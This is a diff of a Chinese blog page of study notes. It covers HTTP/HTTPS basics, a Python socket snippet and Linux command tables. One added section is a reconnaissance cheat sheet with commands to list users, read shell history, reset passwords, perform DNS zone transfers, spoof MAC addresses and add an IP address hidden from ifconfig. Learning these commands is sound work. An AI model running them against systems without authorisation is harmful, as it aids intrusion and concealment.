-<p><strong>b、请求首部字段（请求报文会使用的首部字段）</strong><br>Host：请求资源所在服务器<br>Accept：可处理的媒体类型<br>Accept-Charset：可接收的字符集<br>Accept-Encoding：可接受的内容编码<br>Accept-Language：可接受的自然语言</p>
-<p><strong>c、响应首部字段（响应报文会使用的首部字段）</strong><br>Accept-Ranges：可接受的字节范围<br>Location：令客户端重新定向到的URI<br>Server：HTTP服务器的安装信息d、实体首部字段（请求报文与响应报文的的实体部分使用的首部字段）<br>Allow：资源可支持的HTTP方法<br>Content-Type：实体主类的类型<br>Content-Encoding：实体主体适用的编码方式<br>Content-Language：实体主体的自然语言<br>Content-Length：实体主体的的字节数<br>Content-Range：实体主体的位置范围，一般用于发出部分请求时使用</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/csl/</span> HTTP/1.1</span><br></pre></td></tr></table></figure>
-
-<p><code>GET</code>表示一个读取请求，将从服务器获得网页数据<code>/cs1/</code>表示URL的路径，URL总是以<code>/</code>开头，<code>/</code>就表示首页，最后的<code>HTTP/1.1</code>指示采用的HTTP协议版本是1.1。目前HTTP协议的版本就是1.1，但是大部分服务器也支持1.0版本，主要区别在于1.1版本允许多个HTTP请求复用一个TCP连接，以加快传输速度。</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Host</span>: sports.sina.com.cn</span><br></pre></td></tr></table></figure>
-
-<p>表示请求的域名是<code>sports.sina.com.cn</code>。如果一台服务器有多个网站，服务器就需要通过<code>Host</code>来区分浏览器请求的是哪个网站</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="attribute">Content-Length</span>: 66125</span><br></pre></td></tr></table></figure>
-
-<p><code>Content-Type</code>指示响应的内容，这里是<code>text/html</code>表示HTML网页。</p>
-<p><strong>请注意，浏览器就是依靠<code>Content-Type</code>来判断响应的内容是网页还是图片，是视频还是音乐。</strong></p>
-<p>浏览器并不靠URL来判断响应的内容，所以，即使URL是<code>http://example.com/abc.jpg</code>，它也不一定就是图片。</p>
-<h4 id="—-常用的HTTP方法有哪些？"><a href="#—-常用的HTTP方法有哪些？" class="headerlink" title="—-常用的HTTP方法有哪些？"></a>—-常用的HTTP方法有哪些？</h4><p>GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器<br>POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。<br>PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。<br>HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。<br>DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。<br>OPTIONS：查询相应URI支持的HTTP方法。</p>
-<h4 id="—-HTTP请求"><a href="#—-HTTP请求" class="headerlink" title="—-HTTP请求"></a><strong>—-HTTP请求</strong></h4><p><strong>步骤1：浏览器首先向服务器发送HTTP请求，请求包括：</strong></p>
-<p>方法：<code>GET</code>还是<code>POST</code>，<code>GET</code>仅请求资源，<code>POST</code>会附带用户数据；</p>
-<p>路径：<code>/full/url/path</code>；</p>
-<p>域名：由Host头指定：<code>Host: www.sina.com.cn</code></p>
-<p>以及其他相关的Header；</p>
-<p>如果是POST，那么请求还包括一个Body，包含用户数据。</p>
-<p><strong>步骤2：服务器向浏览器返回HTTP响应，响应包括：</strong></p>
-<p>响应代码：<code>200</code>表示成功，<code>3xx</code>表示重定向( <strong>表示要完成请求，需要进一步操作</strong>)，<code>4xx</code>表示客户端发送的请求有错误，<code>5xx</code>表示服务器端处理时发生了错误；</p>
-<p>响应类型：由<code>Content-Type</code>指定，例如：<code>Content-Type: text/html;charset=utf-8</code>表示响应类型是HTML文本，并且编码是<code>UTF-8</code>，<code>Content-Type: image/jpeg</code>表示响应类型是JPEG格式的图片；</p>
-<p>以及其他相关的Header；</p>
-<p>通常服务器的HTTP响应会携带内容，也就是有一个Body，包含响应的内容，网页的HTML源码就在Body中。</p>
-<p><strong>步骤3：如果浏览器还需要继续向服务器请求其他资源，比如图片，就再次发出HTTP请求，重复步骤1、2</strong></p>
-<p>Web采用的HTTP协议采用了非常简单的请求-响应模式，从而大大简化了开发。当我们编写一个页面时，我们只需要在HTTP响应中把HTML发送出去，不需要考虑如何附带图片、视频等，浏览器如果需要请求图片和视频，它会发送另一个HTTP请求，因此，一个HTTP请求只处理一个资源。</p>
-<p>HTTP协议同时具备极强的扩展性，虽然浏览器请求的是<code>http://www.sina.com.cn/</code>的首页，但是新浪在HTML中可以链入其他服务器的资源，比如</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://i1.sinaimg.cn/home/2013/1008/U8455P30DT20131008135420.png"</span>&gt;</span><br></pre></td></tr></table></figure>
-
-<p>从而将请求压力分散到各个服务器上，并且，一个站点可以链接到其他站点，无数个站点互相链接起来，就形成了World Wide Web，简称“三达不溜”（WWW）。</p>
-<h4 id="—-HTTP格式"><a href="#—-HTTP格式" class="headerlink" title="—-HTTP格式"></a>—-HTTP格式</h4><p>每个HTTP请求和响应都遵循相同的格式，一个HTTP包含Header和Body两部分，其中Body是可选的。</p>
-<p>HTTP协议是一种文本协议，所以，它的格式也非常简单。HTTP GET请求的格式：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/path</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br></pre></td></tr></table></figure>
-
-<p>每个Header一行一个，换行符是<code>\r\n</code>。</p>
-<p>HTTP POST请求的格式：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/path</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br><span class="line"></span><br><span class="line">body data goes here...</span><br></pre></td></tr></table></figure>
-
-<p>当遇到连续两个<code>\r\n</code>时，Header部分结束，后面的数据全部是Body。</p>
-<p>HTTP响应的格式：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">200 OK</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br><span class="line"></span><br><span class="line">body data goes here...</span><br></pre></td></tr></table></figure>
-
-<p>HTTP响应如果包含body，也是通过<code>\r\n\r\n</code>来分隔的。请再次注意，Body的数据类型由<code>Content-Type</code>头来确定，如果是网页，Body就是文本，如果是图片，Body就是图片的二进制数据。</p>
-<p>当存在<code>Content-Encoding</code>时，Body数据是被压缩的，最常见的压缩方式是gzip，所以，看到<code>Content-Encoding: gzip</code>时，需要将Body数据先解压缩，才能得到真正的数据。压缩的目的在于减少Body的大小，加快网络传输。</p>
-<h4 id="2-HTTPS的基本概念"><a href="#2-HTTPS的基本概念" class="headerlink" title="2.HTTPS的基本概念"></a>2.HTTPS的基本概念</h4><h4 id="—-原理"><a href="#—-原理" class="headerlink" title="—-原理"></a><strong>—-原理</strong></h4><p> Https：是以安全为目标的Http通道，是Http的安全版。Https的安全基础是SSL。SSL协议位于<a href="https://baike.baidu.com/item/TCP/IP协议" target="_blank" rel="noopener">TCP/IP协议</a>与各种应用层协议之间，为<a href="https://baike.baidu.com/item/数据通讯" target="_blank" rel="noopener">数据通讯</a>提供安全支持。SSL协议可分为两层：SSL记录协议（SSL Record Protocol），它建立在可靠的传输协议（如TCP）之上，为高层协议提供<a href="https://baike.baidu.com/item/数据封装" target="_blank" rel="noopener">数据封装</a>、压缩、加密等基本功能的支持。SSL握手协议（SSL Handshake Protocol），它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p>
-<p><strong>Https设计目标：</strong></p>
-<p>(1)数据保密性：保证数据内容在传输的过程中不会被第三方查看。就像快递员传递包裹一样，都进行了封装，别人无法获知里面装了什么 。</p>
-<p>(2)数据完整性：及时发现被第三方篡改的传输内容。就像快递员虽然不知道包裹里装了什么东西，但他有可能中途掉包，数据完整性就是指如果被掉包，我们能轻松发现并拒收 。</p>
-<p>(3)身份校验安全性：保证数据到达用户期望的目的地。就像我们邮寄包裹时，虽然是一个封装好的未掉包的包裹，但必须确定这个包裹不会送错地方，通过身份校验来确保送对了地方 。</p>
-<p><strong>Https原理：</strong></p>
-<p>① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；</p>
-<p>② 服务器从算法列表中选择一种加密算法，并将它和一份包含<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>公用密钥的证书发送给<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；</p>
-<p>③ 客户端对服务器的证书进行验证（有关验证证书，可以参考<a href="https://baike.baidu.com/item/数字签名/212550" target="_blank" rel="noopener">数字签名</a>），并抽取服m务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；</p>
-<p>④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 <a href="https://baike.baidu.com/item/MAC/173" target="_blank" rel="noopener">MAC</a>密钥（参考 DH密钥交换算法） ；</p>
-<p>⑤ 客户端将所有握手消息的 MAC 值发送给服务器；</p>
-<p>⑥ 服务器将所有握手消息的 MAC 值发送给客户端。</p>
-<h4 id="3-HTTP与HTTPS的区别"><a href="#3-HTTP与HTTPS的区别" class="headerlink" title="3.HTTP与HTTPS的区别"></a><strong>3.HTTP与HTTPS的区别</strong></h4><p>1、https协议需要到CA （Certificate Authority，证书颁发机构）申请证书，一般免费证书较少，因而需要一定费用。(原来网易官网是http，而网易邮箱是https。)</p>
-<p>2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。</p>
-<p>3、http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</p>
-<p>4、http的连接很简单，是无状态的。Https协议是由SSL+Http协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。(无状态的意思是其数据包的发送、传输和接收都是相互独立的。无连接的意思是指通信双方都不长久的维持对方的任何信息。)</p>
-<h4 id="—-HTTPS的缺点（对比优点）"><a href="#—-HTTPS的缺点（对比优点）" class="headerlink" title="—-HTTPS的缺点（对比优点）"></a><strong>—-HTTPS的缺点（对比优点）</strong></h4><p>1、Https协议握手阶段比较费时，会使页面的加载时间延长近。</p>
-<p>2、Https连接缓存不如Http高效，会增加数据开销，甚至已有的安全措施也会因此而受到影响。</p>
-<p>3、Https协议的安全是有范围的，在黑客攻击、拒绝服务攻击和服务器劫持等方面几乎起不到什么作用。</p>
-<p>4、SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名，IPv4资源不可能支撑这个消耗。</p>
-<p>5、成本增加。部署 Https后，因为 Https协议的工作要增加额外的计算资源消耗，例如 SSL 协议加密算法和 SSL 交互次数将占用一定的计算资源和服务器成本。</p>
-<p>6、Https协议的加密范围也比较有限。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。</p>
-<h4 id="—-HTTP1-1版本新特性"><a href="#—-HTTP1-1版本新特性" class="headerlink" title="—-HTTP1.1版本新特性"></a>—-HTTP1.1版本新特性</h4><p>a、默认持久连接节省通信量，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求</p>
-<p>b、管线化，客户端可以同时发出多个HTTP请求，而不用一个个等待响应</p>
-<p>c、断点续传原理</p>
-<h4 id="—-HTTP的缺点与HTTPS"><a href="#—-HTTP的缺点与HTTPS" class="headerlink" title="—-HTTP的缺点与HTTPS"></a>—-HTTP的缺点与HTTPS</h4><p>a、通信使用明文不加密，内容可能被窃听<br>b、不验证通信方身份，可能遭到伪装<br>c、无法验证报文完整性，可能被篡改</p>
-<p>HTTPS就是HTTP加上加密处理（一般是SSL安全通信线路）+认证+完整性保护</p>
 <hr>
 <h3 id="python网络编程"><a href="#python网络编程" class="headerlink" title="python网络编程"></a><strong>python网络编程</strong></h3><h4 id="1-TCP客户端编程"><a href="#1-TCP客户端编程" class="headerlink" title="1.TCP客户端编程"></a>1.TCP客户端编程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入socket库:</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个socket:</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># 建立连接:</span></span><br><span class="line">s.connect((<span class="string">'www.sina.com.cn'</span>, <span class="number">80</span>))</span><br></pre></td></tr></table></figure>
 
@@ -1044,47 +1127,59 @@
 <table>
 <thead>
 <tr>
-<th align="center">more -5 proxy.py</th>
-<th align="center">每5行为1页，按空格键切换下一页，回车键为下一行</th>
+<th align="left">常用查询命令</th>
+<th align="left">说明</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center"><strong>ls -lha | more -5</strong></td>
-<td align="center"><strong>按q即可退出</strong></td>
+<td align="left"><strong>more -5 proxy.py</strong></td>
+<td align="left"><strong>每5行为1页，按空格键切换下一页，回车键为下一行</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>echo hello &gt; kail.txt</strong></td>
-<td align="center"><strong>直接覆盖原本的内容</strong></td>
+<td align="left"><strong>ls -lha | more -5</strong></td>
+<td align="left"><strong>按q即可退出</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>echo hello &gt;&gt;kail.txt</strong></td>
-<td align="center"><strong>追加在原本的内容上</strong></td>
+<td align="left"><strong>echo hello &gt; kail.txt</strong></td>
+<td align="left"><strong>直接覆盖原本的内容</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>find  /root  -name  proxy.py</strong></td>
-<td align="center"><strong>搜索root目录下，名为proxy.py的文件</strong></td>
+<td align="left"><strong>echo hello &gt;&gt;kail.txt</strong></td>
+<td align="left"><strong>追加在原本的内容上</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>find .  -ctime  -20</strong></td>
-<td align="center"><strong>搜索当前目录下，最近20天内更新过的所有文件</strong></td>
+<td align="left"><strong>find  /root  -name  proxy.py</strong></td>
+<td align="left"><strong>搜索root目录下，名为proxy.py的文件</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>find .  -cmin   -20</strong></td>
-<td align="center"><strong>搜索当前目录下，最近20分钟内更新过的所有文件</strong></td>
+<td align="left"><strong>find .  -ctime  -20</strong></td>
+<td align="left"><strong>搜索当前目录下，最近20天内更新过的所有文件</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>find  .       -name    ‘  *.py  ‘    -a   -size    +8   -a     -type f</strong></td>
-<td align="center"><strong>注意加单引号表示转义</strong></td>
+<td align="left"><strong>find .  -cmin   -20</strong></td>
+<td align="left"><strong>搜索当前目录下，最近20分钟内更新过的所有文件</strong></td>
+</tr>
+<tr>
+<td align="left"><strong>find  .       -name    ‘  *.py  ‘     -a     -type f</strong></td>
+<td align="left"><strong>注意加单引号表示转义</strong></td>
+</tr>
+<tr>
+<td align="left"><strong>-a   表示  and  ，-o 表示or</strong></td>
+<td align="left"><strong>type表示文件类型，f文件、d目录、l链接文件</strong></td>
 </tr>
 </tbody></table>
 <table>
 <thead>
 <tr>
-<th align="left"><strong>mv proxy.py     ~/desktop/kaillinux/</strong></th>
-<th align="left"><strong>移动文件到指定目录下，这是剪切</strong></th>
+<th align="left">常用文件操作命令</th>
+<th align="left">说明</th>
 </tr>
 </thead>
 <tbody><tr>
+<td align="left"><strong>mv proxy.py     ~/desktop/kaillinux/</strong></td>
+<td align="left"><strong>移动文件到指定目录下，这是剪切</strong></td>
+</tr>
+<tr>
 <td align="left"><strong>cp -r kaillinux/  ~</strong></td>
 <td align="left"><strong>复制kaillinux到~目录下，注意需要加-r（mv可不加）</strong></td>
 </tr>
@@ -1121,145 +1216,147 @@
 <td align="left"><strong>pkill和killall可杀死多个进程，直接杀死程序(httpd为程序名)</strong></td>
 </tr>
 </tbody></table>
-<p><strong>、type     文件类型</strong>   <strong>———-f表示文件</strong>       <strong>————–d表示目录（文件夹）</strong>   <strong>——–l 表示软链接文件（Link）</strong>                                    </p>
-<p><strong>-a   表示  and 同时满足</strong>，          <strong>-o 表示or 或者，满足其中一个即可</strong> </p>
-<h2 id="操作系统信息收集"><a href="#操作系统信息收集" class="headerlink" title="操作系统信息收集"></a>操作系统信息收集</h2><p>查看服务器版本：</p>
+<hr>
+<h2 id="操作系统信息收集"><a href="#操作系统信息收集" class="headerlink" title="操作系统信息收集"></a>操作系统信息收集</h2><table>
+<thead>
+<tr>
+<th>本地信息查看命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>whoami</strong></td>
+<td><strong>显示 Linux 上当前已登录用户。</strong></td>
+</tr>
+<tr>
+<td><strong>id</strong></td>
+<td><strong>向用户显示当前已登录的用户和组。</strong></td>
+</tr>
+<tr>
+<td><strong>last</strong></td>
+<td><strong>显示最后一次登陆的用户。</strong></td>
+</tr>
+<tr>
+<td><strong>mount</strong></td>
+<td><strong>显示已挂载的驱动。</strong></td>
+</tr>
+<tr>
+<td><strong>df -h</strong></td>
+<td><strong>用人类可读的输出显示磁盘使用情况。</strong></td>
+</tr>
+<tr>
+<td><strong>echo “user:passwd” | chpasswd</strong></td>
+<td><strong>用一行命令重置密码。</strong></td>
+</tr>
+<tr>
+<td><strong>getent passwd</strong></td>
+<td><strong>列出 Linux 上的用户。</strong></td>
+</tr>
+<tr>
+<td><strong>strings /usr/local/bin/blah</strong></td>
+<td><strong>显示非文本文件的内容，例如：一个二进制文件里面有什么。</strong></td>
+</tr>
+<tr>
+<td><strong>uname -ar</strong></td>
+<td><strong>显示运行中的内核版本。</strong></td>
+</tr>
+<tr>
+<td><strong>PATH=$PATH:/my/new-path</strong></td>
+<td><strong>添加一个新的路径，方便进行本地文件系统（FS）操作。</strong></td>
+</tr>
+<tr>
+<td><strong>history</strong></td>
+<td><strong>显示用户在之前执行的 bash 脚本历史记录，还有敲入的命令。</strong></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>常见操作命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>netstat -tulpn</strong></td>
+<td><strong>在 Linux 中显示对应了进程ID（PID）的网络端口。</strong></td>
+</tr>
+<tr>
+<td><strong>watch ss -stplu</strong></td>
+<td><strong>通过套接字实时观察 TCP, UDP 端口。</strong></td>
+</tr>
+<tr>
+<td><strong>lsof -i</strong></td>
+<td><strong>显示确认了的连接。</strong></td>
+</tr>
+<tr>
+<td><strong>macchanger -m MACADDR INTR</strong></td>
+<td><strong>在 KALI Linux 上修改 MAC 地址。</strong></td>
+</tr>
+<tr>
+<td><strong>ifconfig eth0 192.168.2.1/24</strong></td>
+<td><strong>在 Linux 中设置 ID 地址。</strong></td>
+</tr>
+<tr>
+<td><strong>ifconfig eth0:1 192.168.2.3/24</strong></td>
+<td><strong>在 Linux 中向现有的网络接口添加 IP 地址。</strong></td>
+</tr>
+<tr>
+<td><strong>ifconfig eth0 hw ether MACADDR</strong></td>
+<td><strong>使用 ifconfig 修改 Linux 中的 MAC 地址。</strong></td>
+</tr>
+<tr>
+<td><strong>ifconfig eth0 mtu 1500</strong></td>
+<td><strong>在 Linux 中使用 ifconfig 修改 MTU 的大小，将 1500 改为你想要的 MTU。</strong></td>
+</tr>
+<tr>
+<td><strong>dig -x 192.168.1.1</strong></td>
+<td><strong>对 IP 地址进行反向查找。</strong></td>
+</tr>
+<tr>
+<td><strong>host 192.168.1.1</strong></td>
+<td><strong>在一个 IP 地址上进行反向查找，适用于没有安装 dig 的情况。</strong></td>
+</tr>
+<tr>
+<td><strong>dig @192.168.2.2 domain.com -t AXFR</strong></td>
+<td><strong>使用 dig 执行一次 DNS 区域传输。</strong></td>
+</tr>
+<tr>
+<td><strong>host -l domain.com nameserver</strong></td>
+<td><strong>使用 host 执行一次 DNS 区域传输。</strong></td>
+</tr>
+<tr>
+<td><strong>nbtstat -A x.x.x.x</strong></td>
+<td><strong>获取 IP 地址对应的域名。</strong></td>
+</tr>
+<tr>
+<td><strong>ip addr add 192.168.2.22/24 dev eth0</strong></td>
+<td><strong>向 Linux 添加一个隐藏的 IP 地址，在执行 ifconfig 命令时不会显示这个 IP 地址。</strong></td>
+</tr>
+<tr>
+<td><strong>tcpkill -9 host google.com</strong></td>
+<td><strong>阻止从主机访问 google.com。</strong></td>
+</tr>
+<tr>
+<td><strong>echo “1” &gt; /proc/sys/net/ipv4/ip_forward</strong></td>
+<td><strong>启用 IP 转发，将 Linux 盒子变成一个路由器——这样就方便通过这个盒子来进行路由流量的控制。</strong></td>
+</tr>
+<tr>
+<td><strong>echo “8.8.8.8” &gt; /etc/resolv.conf</strong></td>
+<td><strong>使用 Google 的 DNS。</strong></td>
+</tr>
+</tbody></table>
+<p><strong>查看服务器版本：</strong></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*<span class="literal">-release</span></span><br><span class="line">cat /etc/lsb<span class="literal">-release</span> <span class="comment"># 基于 Debian</span></span><br><span class="line">cat /etc/redhat<span class="literal">-release</span> <span class="comment"># 基于 Redhat</span></span><br></pre></td></tr></table></figure>
 
-<p>查看内核的版本信息？</p>
+<p><strong>查看内核的版本信息？</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br></pre></td></tr></table></figure>
 
 
 
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>netstat -tulpn</td>
-<td>在 Linux 中显示对应了进程ID（PID）的网络端口。</td>
-</tr>
-<tr>
-<td>watch ss -stplu</td>
-<td>通过套接字实时观察 TCP, UDP 端口。</td>
-</tr>
-<tr>
-<td>lsof -i</td>
-<td>显示确认了的连接。</td>
-</tr>
-<tr>
-<td>macchanger -m MACADDR INTR</td>
-<td>在 KALI Linux 上修改 MAC 地址。</td>
-</tr>
-<tr>
-<td>ifconfig eth0 192.168.2.1/24</td>
-<td>在 Linux 中设置 ID 地址。</td>
-</tr>
-<tr>
-<td>ifconfig eth0:1 192.168.2.3/24</td>
-<td>在 Linux 中向现有的网络接口添加 IP 地址。</td>
-</tr>
-<tr>
-<td>ifconfig eth0 hw ether MACADDR</td>
-<td>使用 ifconfig 修改 Linux 中的 MAC 地址。</td>
-</tr>
-<tr>
-<td>ifconfig eth0 mtu 1500</td>
-<td>在 Linux 中使用 ifconfig 修改 MTU 的大小，将 1500 改为你想要的 MTU。</td>
-</tr>
-<tr>
-<td>dig -x 192.168.1.1</td>
-<td>对 IP 地址进行反向查找。</td>
-</tr>
-<tr>
-<td>host 192.168.1.1</td>
-<td>在一个 IP 地址上进行反向查找，适用于没有安装 dig 的情况。</td>
-</tr>
-<tr>
-<td>dig @192.168.2.2 domain.com -t AXFR</td>
-<td>使用 dig 执行一次 DNS 区域传输。</td>
-</tr>
-<tr>
-<td>host -l domain.com nameserver</td>
-<td>使用 host 执行一次 DNS 区域传输。</td>
-</tr>
-<tr>
-<td>nbtstat -A x.x.x.x</td>
-<td>获取 IP 地址对应的域名。</td>
-</tr>
-<tr>
-<td>ip addr add 192.168.2.22/24 dev eth0</td>
-<td>向 Linux 添加一个隐藏的 IP 地址，在执行 ifconfig 命令时不会显示这个 IP 地址。</td>
-</tr>
-<tr>
-<td>tcpkill -9 host google.com</td>
-<td>阻止从主机访问 google.com。</td>
-</tr>
-<tr>
-<td>echo “1” &gt; /proc/sys/net/ipv4/ip_forward</td>
-<td>启用 IP 转发，将 Linux 盒子变成一个路由器——这样就方便通过这个盒子来进行路由流量的控制。</td>
-</tr>
-<tr>
-<td>echo “8.8.8.8” &gt; /etc/resolv.conf</td>
-<td>使用 Google 的 DNS。</td>
-</tr>
-</tbody></table>
-<p>对于本地的枚举检查很有用。</p>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>whoami</td>
-<td>显示 Linux 上当前已登录用户。</td>
-</tr>
-<tr>
-<td>id</td>
-<td>向用户显示当前已登录的用户和组。</td>
-</tr>
-<tr>
-<td>last</td>
-<td>显示最后一次登陆的用户。</td>
-</tr>
-<tr>
-<td>mount</td>
-<td>显示已挂载的驱动。</td>
-</tr>
-<tr>
-<td>df -h</td>
-<td>用人类可读的输出显示磁盘使用情况。</td>
-</tr>
-<tr>
-<td>echo “user:passwd” | chpasswd</td>
-<td>用一行命令重置密码。</td>
-</tr>
-<tr>
-<td>getent passwd</td>
-<td>列出 Linux 上的用户。</td>
-</tr>
-<tr>
-<td>strings /usr/local/bin/blah</td>
-<td>显示非文本文件的内容，例如：一个二进制文件里面有什么。</td>
-</tr>
-<tr>
-<td>uname -ar</td>
-<td>显示运行中的内核版本。</td>
-</tr>
-<tr>
-<td>PATH=$PATH:/my/new-path</td>
-<td>添加一个新的路径，方便进行本地文件系统（FS）操作。</td>
-</tr>
-<tr>
-<td>history</td>
-<td>显示用户在之前执行的 bash 脚本历史记录，还有敲入的命令。</td>
-</tr>
-</tbody></table>
+
+
+
+
 <h4 id><a href="#" class="headerlink" title></a></h4><p><strong>基于 Redhat / CentOS / RPM 的发行版</strong></p>
 <table>
 <thead>
@@ -1281,72 +1378,7 @@
 <td>检查已安装的 RPM 是否针对 CVE 打了补丁，可以用 grep 命令过滤出跟 CVE 有关的输出。LeoXu</td>
 </tr>
 </tbody></table>
-<h2 id="YUM-命令"><a href="#YUM-命令" class="headerlink" title="YUM 命令"></a><strong>YUM 命令</strong></h2><p>基于 RPM 的系统使用了包管理器, 你可以用这些命令获取到有关已安装包或者其它工具的有用信息。</p>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>yum update</td>
-<td>使用 YUM 更新所有的 RPM 包，也会显示出哪些已经过时了。</td>
-</tr>
-<tr>
-<td>yum update httpd</td>
-<td>更新单独的包，在此例中是 HTTPD (Apache)。</td>
-</tr>
-<tr>
-<td>yum install package</td>
-<td>使用 YUM 安装一个包。</td>
-</tr>
-<tr>
-<td>yum –exclude=package kernel* update</td>
-<td>在使用 YUM 时将一个包排除在外不更新。</td>
-</tr>
-<tr>
-<td>yum remove package</td>
-<td>使用 YUM 删除包。</td>
-</tr>
-<tr>
-<td>yum erase package</td>
-<td>使用 YUM 删除包。</td>
-</tr>
-<tr>
-<td>yum list package</td>
-<td>列出有关 yum 包的信息。</td>
-</tr>
-<tr>
-<td>yum provides httpd</td>
-<td>显示一个包是的用途，例如： Apache HTTPD Server。</td>
-</tr>
-<tr>
-<td>yum info httpd</td>
-<td>显示包信息，架构，版本等信息。</td>
-</tr>
-<tr>
-<td>yum localinstall blah.rpm</td>
-<td>使用 YUM 来安装本地 RPM， 从资源库进行安装。</td>
-</tr>
-<tr>
-<td>yum deplist package</td>
-<td>显示包的提供方信息。</td>
-</tr>
-<tr>
-<td>yum list installed | more</td>
-<td>列出所有已安装的包。</td>
-</tr>
-<tr>
-<td>yum grouplist | more</td>
-<td>显示所有的 YUM 分组。</td>
-</tr>
-<tr>
-<td>yum groupinstall ‘Development Tools’</td>
-<td>安装 YUM 分组。</td>
-</tr>
-</tbody></table>
-<h4 id="-1"><a href="#-1" class="headerlink" title></a></h4><p>基于 Debian / Ubuntu / .deb 的发行版 </p>
+<p><strong>基于 Debian / Ubuntu / .deb 的发行版</strong> </p>
 <table>
 <thead>
 <tr>
@@ -1387,7 +1419,7 @@
 <td>删除一个 Linux 用户。</td>
 </tr>
 </tbody></table>
